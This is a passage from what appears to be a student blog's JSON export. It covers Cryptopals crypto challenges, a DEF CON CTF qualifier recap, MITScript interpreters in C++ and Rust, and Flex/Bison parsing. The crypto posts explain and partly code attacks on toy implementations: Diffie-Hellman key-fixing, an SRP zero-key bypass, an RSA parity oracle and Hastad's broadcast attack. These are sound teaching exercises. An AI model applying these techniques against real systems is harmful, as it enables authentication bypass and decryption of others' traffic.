dr)k^{-1} \\\\ &amp;= (m_1 - m_2)k^{-1} \\\\ k &amp;= \\frac{m_1 - m_2}{s_1 - s_2} \\end{align} $$ Challenge 45 DSA parameter tampering If we make the generator equal to $p+1$, then raising it to any power mod p will be 1. This allows us to forge a signature for any message. Challenge 46 RSA parity oracle The idea is to multiply the message by successive powers of 2, and using our parity oracle to check whether the result is even or odd. This allows us to update the upper or lower bound — if odd, the multiplication wrapped the modulus, and we update the lower bound. If even, we didn't wrap the modulus, and we have a tighter higher bound. The answer at this StackExchange post allows us to see why. Briefly, when we multiply by 2 and then 4, if we get (even, even) then we haven't wrapped the modulus, and the message is &lt; N/4. If we get (odd, odd), then we know that we've wrapped the modulus twice — only possible if 3/4N &lt; P &lt; N. Make sure you see why: the result of the first doubling will be between 1/2N and N, so the second doubling will again wrap the modulus. Do this iteratively, until you tighten the bounds enough to get every byte of the message, which will be discovered byte-by-byte. Challenge 47 Bleichenbacher's attack","categories":[{"name":"Crypto","slug":"Crypto","permalink":"http://raywang.tech/categories/Crypto/"}],"tags":[{"name":"cryptopals","slug":"cryptopals","permalink":"http://raywang.tech/tags/cryptopals/"}]},{"title":"DEF CON CTF Qualifier 2017","slug":"2017/DEF CON CTF Qualifier 2017","date":"2017-05-03T16:12:00.000Z","updated":"2017-05-05T20:05:05.000Z","comments":true,"path":"2017/05/03/2017/DEF CON CTF Qualifier 2017/","link":"","permalink":"http://raywang.tech/2017/05/03/2017/DEF CON CTF Qualifier 2017/","excerpt":"","text":"Update 5/5/17: We qualified to DEF CON CTF 2017!!!! We just got the email today! Congrats to everyone from Lab RATs, TechSec, and RPISEC that competed. Vegas, here we come! &lt;!--- more --&gt; This past weekend, I competed in my first DEF CON CTF Qualifier. Our club TechSec teamed up with Lab RATs (Lincoln Labs' CTF team) and RPISEC, and this powerhouse team ended up placing 10th. We beat out some very strong teams, including LCBC (the top Russian team), Dragon Sector (Poland), KaisHack (Korea Advanced Inst. of Science and Tech), and binja (Japan). What's at stake Held in Las Vegas every July at the DEF CON conference, DEF CON CTF attracts the best hacking teams in the world. Teams compete year-round to nab a qualification spot in Vegas and have a chance at the title. Format and griping Let me get a few complaints out of the way. A few things that bother me about DEF CON CTF are the lack of clarity on qualification rules and the frustrating format of the qualifier. First of all, all the challenges are Reverse Engineering and Pwn/Exploitation — most are totally inaccessible to beginners like most of TechSec's members. There was one problem in the Web category that actually turned out to be pwn as well (surprise!). Also, for the first two days, only a few challenges are ever available at a time, because most are locked. The team that solves the most recent challenge gets to choose which challenge to unlock next. The small numbers of challenges are meant to not overwhelm smaller teams — but on the last day, the floodgates open... LegitBS has been organizer of the CTF since 2013. They usually take 15 teams from eight prequalifying events + DEF CON Quals, but how they deal with teams that qualify multiple times is uncertain. I wish they were more clear/communicative about this. Last year, LegitBS took ten from DEF CON Quals because two teams (LCBC and PPP) prequaled twice and another prequaled team (StratumAuhuur) dropped out. This year, it seems that they're taking nine, just missing us :(. At the very least, we helped Lab RATs jump from 32nd place to 10th from last year to this year. We will probably receive an email later this week as to whether we've qualified or are first alternates. There's a small chance we may still make it, if another team drops out or a team that's already qualed wins the last qualifying event, 0ctf, in June. Regardless of whether we end up qualifying, I had a thrilling experience. Rahul (fortenforge) and I worked with Lincoln at the BeaverWorks space the whole weekend, contributing where we could. We took the occasional break for Lego Batman, MIT tent parties, and sleep, but otherwise we were plugged in. In the antepenultimate hour, our team solved three challenges in quick succession — awsno (the web chal), pegem, and pepperidge farm. That put us in a tie with two other teams, and we needed just one more solve to guarantee our spot. We were working on four other chals, none of which we ended up solving in time. &lt;br&gt; Challenges I won't be doing full writeups in this blog post, but I'll be describing some of my favorite challenges briefly. Pegem Pegem was a problem in the RE category (but actually pwn) in the one-instruction esolang SUBLEQ (SUbtract and Branch if Less than or EQual to zero). You had to solve a peg game written in SUBLEQ, run by a C emulator. Once you won the game, there was a &quot;buffer overflow&quot; that allowed you to modify the SUBLEQ program itself, changing its control flow to print out the flag byte-by-byte. The flag: Who needs more than one instruction? Insanity!!! This challenge took in audio files zlib-compressed, and used a speech-to-text library to interpret each word as either 'insanity' or 'insane'. Depending on how many 'insanities' were preceding an 'insane', the program would execute one of 9 opcodes in a stack-based interpreter. The exploitable bugs were in the interpreter, so we used OSX's say command to produce audio files with the word insanity repeated 1-100 times. Thanks Samantha (or Siri, as you might know her)! Jargon vito fuzyll + gynophage hj hoju = bja lightning fuzyll That's the kind of shit that I spent the wee hours of Sunday staring at. This was a black-box RE problem that took in nibbles of data over a network port, and interpreted them as random words or names of the organizers — vito, selir, jymbolia, etc. Each nibble corresponded to an opcode for a stack-based interpeter — dead beaf was push, xyzzy was multiply. I discovered a syscall opcode that took whatever was pushed onto the stack and executed that syscall, so I started fuzzing until I found one valid syscall — hj hoju, that pushed a bunch of crap to the stack. This crap turned out to be the flag, once fortenforge figured out how the words corresponded to digits! Quite a team effort and a fun problem, though I wish we had solved a bit faster, given that I was staring at the flag without realizing it for hours. &lt;br&gt; All we can do now is wait and see... at the very least, our chances look good for next year.","categories":[{"name":"CTF","slug":"CTF","permalink":"http://raywang.tech/categories/CTF/"}],"tags":[{"name":"TechSec","slug":"TechSec","permalink":"http://raywang.tech/tags/TechSec/"}]},{"title":"Generating and Interpreting Bytecode for MITScript — Using Rust","slug":"Generating-and-interpreting-bytecode-for-MITScript-—-using-Rust","date":"2017-05-03T16:00:40.000Z","updated":"2017-05-03T16:06:07.000Z","comments":true,"path":"2017/05/03/Generating-and-interpreting-bytecode-for-MITScript-—-using-Rust/","link":"","permalink":"http://raywang.tech/2017/05/03/Generating-and-interpreting-bytecode-for-MITScript-—-using-Rust/","excerpt":"","text":"Well, this was my first foray into the world of Rust, the systems language that is Mozilla's precious baby. And what better way to learn this hip new language than to write an MITScript bytecode interpreter for Computer Language Engineering? Rust was not gentle for this first-time developer. It does so much to protect you that my first attempt writing a few hundred lines of code resulted in the same number of compiler errors, and I needed a lot of help from my team to just get anything to compile. For this reason, it's not great for iterating quickly if you aren't very experienced already. But, I'm licking my chops at the fact that the end result will be much safer, and hopefully faster, than our classmates' C++ compilers. This post will be about the struggles I encountered as a Rust newbie, as well as the fun of generating/interpreting MITScript bytecode. &lt;!-- more --&gt; Fortunately, I had some great Rust developers on my team – Jason and James Gilles, who have been avid Rustaceans for years. If you have ever seen bytecode, you'll expect to see some non-human-readable hex bytes that stand for instructions. Instead, we have a strange text-based bytecode consisting of the following instructions: Load/store instructions: 1234567891011121314LoadConst LoadFunc LoadLocal StoreLocal LoadGlobal StoreGlobal PushReferenceLoadReference StoreReference AllocRecord FieldLoad FieldStore IndexLoad IndexStore Closure functions: 123AllocClosure Call Return Binary/unary ops: 1234567891011Add Sub Mul Div Neg Gt Geq Eq And Or Not Control flow: 12GotoIf Stack manipulation: 123Dup Swap Pop And the full bytecode is a series of nested functions, like 123456789101112131415161718192021222324252627282930313233343536373839404142434445function&#123; functions = [ function &#123; functions =[ function &#123; functions = [], constants = [], parameter_count = 1, local_vars = [z], local_ref_vars = [], free_vars = [y], names = [x], instructions = [ ... return ] &#125; ], constants = [None, 1], parameter_count = 1, local_vars = [y, g], local_ref_vars = [y], free_vars = [], names = [], instructions = [ ... return ] &#125; ], constants = [1, None], parameter_count = 1, local_vars = [], local_ref_vars = [], free_vars = [], names = [x, f], instructions = [ ... ]&#125; Some things to note: A free_var is a variable from a parent scope that's accessed in the current function. A closure contains a function, as well as a list of references to the free variables in the nested function. So, when we make a call, we need to clone all the closure's free variable references into the newly created frame. Pieces of the puzzle We split up the work into three parts. James quickly finished the bytecode parser, using the Rust library lalrpop. Jason and I worked on (last minute) the bytecode generation and interpreting, respectively. Each bytecode function was modeled as a Function struct. I also have a Frame structure that, as in the AST interpreter from Lab 2, contains the context for the currently executing closure. Most importantly, there is an operand stack onto which references, values, closures, etc. are pushed and popped as opcodes are executed. The HeapValue enum lists them all: 123456789101112131415type FrameSlot = Gc&lt;RefCell&lt;HeapValue&gt;&gt;;pub enum HeapValue &#123; Reference(FrameSlot), Record(Gc&lt;RefCell&lt;Record&gt;&gt;), Function(Gc&lt;Function&gt;), Closure(Gc&lt;Closure&gt;), // note: oddly enough, foreign functions behave more like // closures, since you can actually call them ForeignFunction(ForeignFunction), String(String), Integer(i64), Boolean(bool), None,&#125; References have a layer of indirection provided by the Gc&lt;RefCell&lt;&gt;&gt; construct in Rust. Gc is just an alias for Rc. In Rust, Rc is a reference-counted pointer, and RefCell is a wrapper for a mutable value. RefCell introduces something called &quot;interior mutability&quot;, which allows us to modify an otherwise-immutable location like a field in a struct. We can use borrow or borrow_mut to get a pointer to the value contained in the RefCell. The bytecode generator Jason did this part almost entirely himself, and had to wrangle with some tricky scoping rules that I still don't entirely understand. One key function is lookup_variable, which determines whether a variable is a reference, local, or global. 123456789101112131415161718/// Determines what scope a variable's value should be found inpub fn lookup_variable(&amp;mut self, name: &amp;str) &#123; if self.globals.contains(name) &#123; self.map.insert(name.to_owned(), Location::Global); &#125; else if self.locals.contains(name) &#123; self.map.insert(name.to_owned(), Location::Local); &#125; else if self.lookup_ref(name) &#123; // We found the variable in a parent scope self.free.push(name.to_owned()); self.map.insert(name.to_owned(), Location::Reference); &#125; else if self.lookup_global(name) &#123; // Found the var in one of the active globals self.globals.push(name.to_owned()); self.map.insert(name.to_owned(), Location::Global); &#125; else &#123; panic!(\"Uninitialized variables &#123;&#125;\", name); &#125; &#125; lookup_ref also propagates up to parents, pushing a reference variable in parent scopes, because it has to be in each parent scope to be copied down to the current scope! To be more clear, say we have nested functions f1, f2...f100; and f100 uses some variable x that is local to f3. f4...f99 must all have x as a free variable, so when we see that x is being used in f100, lookup_ref will add it as a free variable for all parents. Next, we actually need to start thinking about performance! We'll write a garbage collector for our compiler in Lab 4.","categories":[{"name":"Languages","slug":"Languages","permalink":"http://raywang.tech/categories/Languages/"}],"tags":[{"name":"6.035","slug":"6-035","permalink":"http://raywang.tech/tags/6-035/"}]},{"title":"Matasano Crypto Challenges, Set 5","slug":"set5-writeup","date":"2017-04-21T19:25:14.000Z","updated":"2017-05-21T13:41:13.000Z","comments":true,"path":"2017/04/21/set5-writeup/","link":"","permalink":"http://raywang.tech/2017/04/21/set5-writeup/","excerpt":"","text":"This set was surprisingly easy, actually. The book Understanding Cryptography by Paar &amp; Pelzl is an excellent intro to the basic maths needed for crypto — namely, the group theory and number theory necessary for RSA and Diffie-Hellman. Let's dive in! Challenge 33 Implement Diffie-Hellman Diffie-Hellman is a remarkably simple algorithm for two parties to jointly compute a shared secret key that may be used, for example, as a key for symmetric encryption. Alice and Bob agree on an integer group of prime $p$, with a generator $g$. $g$ raised to every power in ${0...p-1}$, taken $\\bmod p$, can produce every element of $p$. Hence, it is called a &quot;generator&quot; of the group. &lt;!-- more --&gt; So, Alice and Bob each choose a random group element and use that as a power of $g$. Alice computes $A = g^a\\bmod p$, $a \\in Z_p^*$. Bob computes $B = g^b\\bmod p$, $b \\in Z_p^*$. What's important to Diffie-Hellman is that, given $A$ and $g$, one cannot easily compute $a$. This is called the Discrete Log Problem. The value $A$ looks like a totally random element of $Z_p^*$! Then, Alice sends $A$ to Bob and Bob sends $B$ to Alice. Alice computes $B^a \\bmod p$ and Bob computes $A^b \\bmod p$, which are equal, since $g^{ab} = g^{ba}$. Implementing this is easy in python with the built-in pow function. However, for educational purposes, I wrote the modexp function for fast modular exponentiation. The modexp function is taken from Paar and Pelzl. The exponent is converted to binary, and for each bit, we square the result. Also, if the bit is 1, we multiply the result by the base. The final algorithm is 1234567# Create secret keys, random values mod pa = random.randint(0, p)A = modexp(g, a, p)b = random.randint(0, p)B = modexp(g, b, p)shared_key_a = modexp(A, b, p) Challenge 34 Implement a MITM key-fixing attack on Diffie-Hellman with parameter injection Again, pwntools to the rescue! This challenge requires some client/server sockets, which I use the pwntools tubes library for. At a high level, the challenge demonstrates that, if an attacker were able to sit in the middle of a DH key exchange session and modify the messages being passed, he can control the key and decrpyt all the traffic. The client sends (p, g, A) to the server, and the server responds with B. If you recall, p and g are the public agreed-upon parameters for the group prime and generator. A is the Client's piece of the secret key, and B is the Server's piece. If an attacker replaces A and B with p, then both Client and Server will compute the key to be $p^a \\bmod p \\ = p^b \\bmod p = 0$. 0 is then hashed and used as the symmetric key for AES-encrypting messages, so the attacker can decrypt all the communications. Challenge 35 Implement DH with negotiated groups, and break with malicious &quot;g&quot; parameters Let's see what happens when we choose different values for the generator $g$. When $g = 1$, all powers of $g$ are 1 as well, so the secret key is always $1$. When $g = p$, as we saw in the previous challenge, powers are all divisible by $p$, so the key is always $0$. When $g = p-1$ is raised to a power, all the terms with $p$ will be $0 \\bmod p$, leaving either $1$ or $-1 = p-1 \\bmod p$. Challenge 36 Implement Secure Remote Password (SRP) Secure Remote Password is really cool. It is a form of authentication in which the client does not need to reveal her password — a form of zero-knowledge. The setup involves some large primes, and the security relies on discrete log, as before. A large prime modulus N is chosen, along with a generator g and a magic parameter $k$ that is generally set to 3. The server has a verifier for a client that wants to authenticate, $v = g^x$, where $x = H(salt|password)$. A salt is a random value used to safeguard the password hash from being easily identifiable in a hash lookup rainbow table. After exchanging some parameters, both client and server produce a session key $K$. The server needs the verifier to get $K$, while the client needs the password. The server checks that the client's $K$ is equal to the server's computed $K$, and if so, successfully authenticates the client. The full protocol can be seen on Wikipedia. Challenge 37 Break SRP with a zero key Some buggy implementations of SRP allow authentication without knowing the password, as this challenge illustrates. The server produces the session key $K$ by $$ S_{server} = (A\\cdot v^u)^b \\bmod N \\\\ K_{server} = H(S) $$ where $A$ is sent by the Client, $v$ is the verifier, $u$ is a &quot;scrambling parameter&quot;, and $b$ is the server's random value. If $A$ is $0$ or a multiple of $N$, then $S_{server} = 0$, and we can authenticate simply by sending $K_{client} = H(0)$ without knowing the password! Challenge 38 Offline dictionary attack on simplified SRP This problem isn't really that interesting, so I skipped it. But here's the lowdown: if you get MITM on SRP and thus can control the values for some parameters, $b, B, u$, and $salt$, then you can precompute the session keys $K$ for common dictionary words. Doing the bruteforce cracking is not really that interesting, though. Challenge 39 Implement RSA The security of RSA is not based on the discrete log problem, but rather on the difficulty of factoring large numbers. We choose two large primes $p$ and $q$, and compute $n = pq$. Then, we compute the totient, or Euler's phi function, $\\phi(n) = (p-1)(q-1)$. The public key $e$ is usually a small number like 3 or 65537 that is coprime to $n$, and we derive the private key $d$ such that $d*e = 1 \\bmod \\phi(n)$. This is exactly the definition of a modular inverse, so $d$ is the modular inverse of $e$. I implement the Extended Euclidean Algorithm to find the modular inverse of a number, using the algorithm in Pelzl. The EEA will compute the coefficients of the equation $$ gcd(n, e) = s\\cdot n + t\\cdot e = 1 \\bmod n $$ The gcd is 1 because $n$ and $e$ are coprime. $s\\cdot n = 0 \\bmod n$, so we are left with $t\\cdot e = 1 \\bmod n$, directly giving us $t = d$. Here's my EEA: 123456789101112131415161718192021222324252627def egcd(r0, r1): ''' takes the modulus in r0, and the element in r1 returns tuple of (gcd, coefficient 1, coefficient 2) s.t. s0*r0 + t0*r1 = gcd if first value is a modulus, gcd = 1 and t0 is modinv of r1 ''' old_r0, old_r1 = r0, r1 s0, s1 = 1, 0 t0, t1 = 0, 1 while r1 != 0: remainder = r0%r1 q = (r0-remainder)/r1 assert q*r1 + remainder == r0 r0, r1 = r1, remainder new_s = s0 - q*s1 new_t = t0 - q*t1 assert new_s*old_r0 + new_t*old_r1 == remainder s0, s1 = s1, new_s t0, t1 = t1, new_t return (r0, s0, t0) and the driver function that returns the modular inverse: 123456def modinv(mod, a): (gcd, a, b) = egcd(mod, a) if gcd != 1: return None return b % mod With the modinv function, the rest of RSA is straightforward. Challenge 40 E=3 RSA Broadcast Attack 20 Years of Attacks on RSA describes some great attacks on RSA that come in CTFs as well as Matasano challenges. One of the simplest is Hastad's broadcast attack, which allows us to recover a message that has been encrypted with RSA pubkeys that are very small, such as $e = 3$. The Chinese Remainder Theorem is the key to this problem. As the paper describes, we only need the same message encrypted with three different public keys to recover the plaintext. $$ C_1 = M^3 \\bmod N_1 \\\\ C_1 = M^3 \\bmod N_2 \\\\ C_1 = M^3 \\bmod N_3 \\\\ $$ The CRT tells us that there exists some value $C'$ that satisfies $C' = M^3 \\bmod N_1N_2N_3$, a solution to all the equations. We just need to calculate the $C'$ and take its cube root, recovering $M$. The challenge just gives you the CRT equation to solve for $C'$. 123456789101112m_s_1 = N2*N3y1 = ctext1 * m_s_1 * modinv(N1, m_s_1)m_s_2 = N1*N3y2 = ctext2 * m_s_2 * modinv(N2, m_s_2)m_s_3 = N2*N1y3 = ctext3 * m_s_3 * modinv(N3, m_s_3)mod_prod = N1*N2*N3result = (y1 + y2 + y3) % mod_prod Python's cube root (**(1/3.)) is not entirely precise, so I use the gmpy multiple-precision library. 1234cube_root = gmpy.mpz(result).root(3)[0].digits()decrypted_text = binascii.unhexlify(str(hex(int(cube_root))[2:]))assert decrypted_text == \"can't touch this\"","categories":[{"name":"Crypto","slug":"Crypto","permalink":"http://raywang.tech/categories/Crypto/"}],"tags":[{"name":"cryptopals","slug":"cryptopals","permalink":"http://raywang.tech/tags/cryptopals/"}]},{"title":"Writing a C++ Interpreter for MITScript","slug":"Writing-a-C-interpreter-for-MITScript","date":"2017-04-15T21:38:37.000Z","updated":"2017-05-03T16:10:17.000Z","comments":true,"path":"2017/04/15/Writing-a-C-interpreter-for-MITScript/","link":"","permalink":"http://raywang.tech/2017/04/15/Writing-a-C-interpreter-for-MITScript/","excerpt":"","text":"Lab 2 in 6.035 was very satisfying and very fun. After creating the parser/lexer in Lab 1, we got to put our Abstract Syntax Tree to work — we created an interpreter to actually execute valid MITScript! By the end of this lab, we will be able to write arbitrarily complex programs and have them parsed and run. &lt;!-- more --&gt; We have a list of semantic rules that are generally pretty straightforward, but let me point out some interesting aspects. Note that in the stack we map identifiers(variable, function names, etc.) to addresses, and the heap maps addresses to the actual Values. One cool thing is that we don't need to implement the heap ourselves — we can just use the memory allocation built into our language! Anyone familiar with C++ will know of new, which actually allocates space in the heap for an object, and returns a pointer (address) to that space. It seems like a daunting task, but you just have to break it up into small chunks. The professor, Armando, gave us some direction on Piazza for how to get started. Start by defining your Value types. Define a Value class and define sub-classes corresponding to each of the different value types. Define a StackFrame class to represent your stack frames. You can implement the update and read functions as methods in the stack frame. Implement a Visitor that corresponds to your interpreter. By tomorrow, you should also be able to start implementing the behavior for all your operators. The 'newStackFrame' function and the complete logic for updating and reading variables when you have multiple scopes will become clear after we do the lecture on closures. Finally, you will want to implement support for returns that are not at the end of the function and for native functions. Jason Priest, Meghana, and I got together to work on it. The key thing to note when implementing the interpreter is that everything is specified in the semantics — you need to follow it exactly when translating into code, and you can find the answer to all your questions by close examination. Not exactly following the order that Armando suggested, the first thing I tried to do was to get assignments and operators working, so I could do something as simple as x = 5; y = 5; z = x + y;. This would have given me a huge confidence boost, since I felt pretty intimidated by the scope of the lab. Roughly, I tackled this piece-by-piece in the following order: binary ops, assignments, record creation/assignments, function creation/calling, native functions, early returns. Of course, the ninety-ninety aphorism of software engineering holds: The first 90 percent of the code accounts for the first 90 percent of the development time. The remaining 10 percent of the code accounts for the other 90 percent of the development time. The remaining 10% of code on this lab was debugging the ten class-provided tests. Data Structures I first set up the Visitor interface for the interpreter. For more information on how the Visitor interface works, see my previous post. Then for each of the Value types 123456BooleanIntegerStringFunction ::= (frame, code)Record ::= Map[String, Value]*None , I defined toString() functions and a type field (so the overloaded boolean operators like + know what values they're operating on). I also added methods like asFunction() and asRecord() that will throw an IllegalCastException if they're called in the wrong context, or otherwise return this. I still wasn't sure how to deal with Stack Frames. The way that stack frames work is that there is a global stack of these StackFrames, and each StackFrame should contain the &quot;context&quot; of the currently-executing function. When a function is called, a new StackFrame is created, containing its set of local variables and a pointer to its parent frame (the frame where the function was called.) I discovered during debugging that, when an MITScript program starts executing, it should be inside the global StackFrame — all assignments that it makes are available globally. When we need to access a variable, we must check for its existence in the globals, the local frame, and then search recursively in parent stack frames. Function calls The function call is the most complex construct in our language. Most importantly, when we make a call, we need to traverse the body of the function, looking for globals and assignments, and add them to our new StackFrame. This is another case where I needed to know the type of objects — but here, I need to know the type of an AST object. I use dynamic_cast. 12345if (Global* globCast = dynamic_cast&lt;Global*&gt;(stmt))&#123;...&#125; else if (IfStatement* ifCast = dynamic_cast&lt;IfStatement*&gt;(stmt))&#123;...&#125; Note that we need to recursively search inside if statements and while loops during the scan, as well. Native Functions But how to do the native functions? Jason gave me a hint here — create a subclass of Function, which I call NativeFunction. We need to support the following: print(s) Uses the default casting of s to a string and prints it to the console followed by a newline. input() Reads a line of input from the console and returns it as a string value. intcast(s) Expects a string and internally uses the c++ function atoi to parse the string and return an integer value. If the string does not represent an integer (e.g., the string &quot;hello&quot;), the function should raise an IllegalCastException NativeFunction has an evaluateNativeFunction() method that will do the right thing. After adding the ability to return early from functions, I have a really hacky interpreter! Debugging tests Some of these test cases reveal interesting effects of our semantics. For example, test7.mit has a global declaration inside an if statement that's never run — equivalent to 123if (false)&#123; global x; &#125; In this case, we actually need to find this global and make x global in the scope. This is called variable hoisting. Note that there are a lot of crappy things about this interpreter — there is no garbage collection of unused objects, so memory usage might blow up, and it is costly to search recursively for a variable in parent stack frames. The next lab translates our MITScript into bytecode that can optimize away these costs.","categories":[{"name":"Languages","slug":"Languages","permalink":"http://raywang.tech/categories/Languages/"}],"tags":[{"name":"6.035","slug":"6-035","permalink":"http://raywang.tech/tags/6-035/"}]},{"title":"Upcoming Blog Posts — Stay Tuned!","slug":"Upcoming-blog-posts-—-when-I-get-to-them","date":"2017-04-04T18:57:58.000Z","updated":"2017-04-04T20:05:41.000Z","comments":true,"path":"2017/04/04/Upcoming-blog-posts-—-when-I-get-to-them/","link":"","permalink":"http://raywang.tech/2017/04/04/Upcoming-blog-posts-—-when-I-get-to-them/","excerpt":"","text":"I've been insanely busy with a bunch of cool things, which means both more blog content, but also quite a large latency before I get around to writing them. Here's what I've been up to, and what awesome posts/series you can expect in the coming weeks: 6.115 Labs and Final project — Masterlock combo breaker? 6.857 Final project — Boston Symphony Orchestra iPad app pentest CTFs — MITCTF, Cambridge2Cambridge 6.035 MITScript interpreter in Rust &lt;!-- more --&gt; &lt;br&gt; 6.115 Final project — Masterlock combo breaker? Over spring break last week, I spent almost every day in lab for 6.115, working on the infamous Lab 4. The lab is centered around motors. We code assembly for controlling a robot arm with five DC motors providing five degrees of freedom. We also control a unipolar stepper motor for a toy version of optical tomography — getting a cross-section of a dowel on a spinning disk. Practical Electronics for Inventors by Paul Scherz is an awesome book. It's very readable, and without the chapter on DC/stepper motors, this lab would not have been possible. Final Project I have a cool idea for my 6.115 final project. The amazing hacker Samy Kamkar built a Masterlock combo breaker, and I really want to make one of these for my final project. Since I need to use both the 8051 microcontroller and the Cypress PSOC, I could have the 8051+LED interface for selecting combinations, and have the cracking algorithm coded in C for the PSOC. That still may not be enough code... maybe I could also have some computer vision such that I can observe someone turning the lock, and then record/replay the combo? Anyways, will definitely be blogging about my progress on this. &lt;br&gt; 6.857 Final project — Boston Symphony Orchestra iPad app pentest I also need to get started on my 6.857 project, which is penetration testing an iPad application for the Boston Symphony Orchestra. We have an iPad, so I just need to setup a pentesting environment on it and start playing with it! &lt;br&gt; CTFs! I've done a few MIT-based CTFs in the past few weeks — MITCTF, organized by Steven Valdez and my fellow TechSec lead Max Justicz, and the Cambridge2Cambridge CTF Qualifier which I think is one of the most exciting initiatives to come out of MIT. In the inaugural event last year, Cambridge University students came to MIT for an attack-defense CTF and other fun physical challenges like lockpicking. This year's final will be held at Cambridge University in July, so I hope I qualified! I've definitely seen a lot of improvement in my skills since last year — I'm a lot more comfortable with crypto, and have come a long way in pwn and reversing. &lt;br&gt; 6.035 — MITScript and Rust Also, I really need to get cracking on Rust and our 035 bytecode interpreter for Lab 3! Once I've finished Lab 3, I'll publish my blog posts for Lab 2 and Lab 3. Maybe I'll write something about learning Rust, as well ;).","categories":[{"name":"Meta","slug":"Meta","permalink":"http://raywang.tech/categories/Meta/"}],"tags":[]},{"title":"Starting a New Security Club at MIT","slug":"Starting-a-new-security-club-at-MIT","date":"2017-03-14T15:38:51.000Z","updated":"2017-03-14T15:51:32.000Z","comments":true,"path":"2017/03/14/Starting-a-new-security-club-at-MIT/","link":"","permalink":"http://raywang.tech/2017/03/14/Starting-a-new-security-club-at-MIT/","excerpt":"","text":"fortenforge, Devin Neal, and I decided that MIT needed more of a student security community on campus. So, we started TechSec in February 2017! We host weekly meetings on Monday nights and try to get students to compete with us in CTFs on weekends. You can find our meeting/workshop notes, which we laboriously compile for the benefit of our club members, here. So far, we've been holding introduction to reverse engineering and binary workshops. We have a lot more planned, including interesting guest speakers.","categories":[{"name":"TechSec","slug":"TechSec","permalink":"http://raywang.tech/categories/TechSec/"}],"tags":[{"name":"TechSec","slug":"TechSec","permalink":"http://raywang.tech/tags/TechSec/"}]},{"title":"Flex and Bison for a Simple Language, MITScript","slug":"Flex-and-Bison-for-a-simple-language-MITScript","date":"2017-03-07T15:38:11.000Z","updated":"2017-03-26T21:07:19.000Z","comments":true,"path":"2017/03/07/Flex-and-Bison-for-a-simple-language-MITScript/","link":"","permalink":"http://raywang.tech/2017/03/07/Flex-and-Bison-for-a-simple-language-MITScript/","excerpt":"","text":"For the first lab in 6.035, Computer Language Engineering, in Spring 2017, we use Flex, a lexical analyzer library, and Bison, a parser generator, to create a parser for a simple scripting language. The grammar for the language is shown below. &lt;!-- more --&gt; 12345678910111213141516171819202122Program ::= Statement*Statement ::= Assignment | CallStatement | Global | IfStatement | WhileLoop | ReturnGlobal ::= 'global' name ';'Assignment ::= LHS '=' Expression ';'CallStatement ::= Call ';'Block ::= '&#123;' Statement* '&#125;'IfStatement ::= 'if' '(' Expression ')' Block ( 'else' Block )?WhileLoop ::= 'while' '(' Expression ')' BlockReturn ::= 'return' Expression ';'Expression ::= Function | Boolean | RecordFunction ::= 'fun' '(' Name* ')' BlockBoolean ::= Conjunction ( '|' Conjunction )*Conjunction ::= BoolUnit ('&amp;' BoolUnit)*BoolUnit ::= '!'? PredicatePredicate ::= Arithmetic ( ('&lt;' | '&gt;' | '&lt;=' | '&gt;='| '==') Arithmetic)?Arithmetic ::= Product ( ('+' | '-') Product)*Product ::= Unit ( ('*' | '/') Unit)*Unit ::= '-'? (LHS | Constant | Call | '(' Boolean ')' )LHS ::= Name ('.' Name | '[' Expression ']' )*Call ::= LHS '(' (Expression (',' Expression)*)? ')'Record ::= '&#123;' (Name ':' Expression ';')* '&#125;'Constant ::= integer_constant | string_constant The goal is to construct an Abstract Syntax Tree (AST) for any MITScript program and pretty-print it. 123456789101112131415161718Your parser must produce an AST with nodes for the following program constructs:Block ::= [Statement]Global ::= nameAssignment ::= LHS ExpressionExpressionStatement ::= Expression ';'IfStatement ::= Condition ThenPart ElsePartWhileLoop ::= Condition BodyReturn ::= ExpressionFunctionDeclaration ::= [Arguments] BodyBinaryExpression ::= LeftOperand Operator RightOperandUnaryExpression ::= Operand OperatorFieldDereference ::= BaseExpression FieldIndexExpression ::= BaseExpression IndexCall ::= TargetExpression [Arguments]Record ::= Map[String, Expression]IntegerConstantStringConstantNoneConstant Flex How do Flex and Bison work? Much of the lab was reading documentation about these two old utilities. Flex takes a .lex file, which simply lists the regular expressions, tokens, and keywords that will be matched in a program. When Flex works with Bison, every time it matches a token/keyword, it tells Bison about it. It can return the type of token/keyword to Bison, and it can also return an entire matched string or int in a Bison object it has access to, called yylval. Here are examples of both: 1234567&#123;string_const&#125; &#123; //Rule for string constant yylval-&gt;strType = new string(yytext); return T_STRINGCONST;&#125;\"while\" &#123;return T_WHILE;&#125; For us, the lab specifies that: Your lexer must be able to recognize the following kinds of tokens in addition to all the keywords and operators listed above: integer constants consisting of one or more digits 1int_const [0-9][0-9]* string constants wrapped in double quotes and supporting the following escaped characters: \\ &quot; \\n \\t 1string_const (\\&quot;(\\\\.|[^&quot;])*\\&quot;) None constant, equivalent to &quot;NULL&quot; in Java 'true' and 'false' 123&quot;None&quot; &#123;return T_NONE;&#125;&quot;true&quot; &#123;return T_TRUE;&#125;&quot;false&quot; &#123;return T_FALSE;&#125; Name identifiers that start with a letter or underscore, followed by sequence of letters, underscores and numbers. so x0 is a valid variable name, but 0x is not 12345678identifier ([a-zA-Z_][a-zA-Z_0-9]*)...&#123;identifier&#125; &#123; yylval-&gt;strType = new string(yytext); return IDENTIFIER;&#125; The file is compiled in our Makefile with flex --outfile=lexer.cpp --header-file=lexer.h lexer.lex. Bison In the Bison .yy file, we must define several things. First, we must define the union, types, and tokens that Flex and our grammar know about. Then, we need to define our grammar (the most important part!). The grammar section of the .yy file contains rules created simply by converting our MITScript to Bison syntax (more on this soon). Each rule is associated with an action, which contains C++ code to be executed when the rule is matched. How does this fit into everything else? Well, we have a main.cpp file that will call yyparse on stdin, which will match all the tokens and Bison rules, executing their actions. These actions will construct node objects of an AST, which are defined in AST.h. Then, the main.cpp file will call the pretty print function on the root node, which will recursively print the tree. As an example of a rule + action, 1234returnStmt: T_RETURN expr T_SEMICOLON &#123; $$ = new ReturnStatement(*$2); &#125;; Above, the T_RETURN and T_SEMICOLON are tokens that correspond to &quot;return&quot; and &quot;;&quot; in our lex file. The components matched by the rule can be accessed by $n, which stands for the value of the nth component. The semantic value for the grouping being constructed is $$. The ReturnStatement object is an AST node class defined in another file, AST.h, which we'll get to. But let me go back to the union. &quot;The %union declaration specifies the entire collection of possible data types for semantic values.&quot; Lexer can access these union fields in yylval. 12345678910111213%union &#123; int intconst; string *strType; // goes with string_const in lex Block* blockType; Statement* statementType; Expression* expressionType; vector&lt;Expression*&gt; *exprListType; vector&lt;Statement*&gt; *stmtListType; vector&lt;string*&gt; *stringListType; //maybe don't need for function declaration list map&lt;string, Expression*&gt; *recordMapType;&#125; You can see 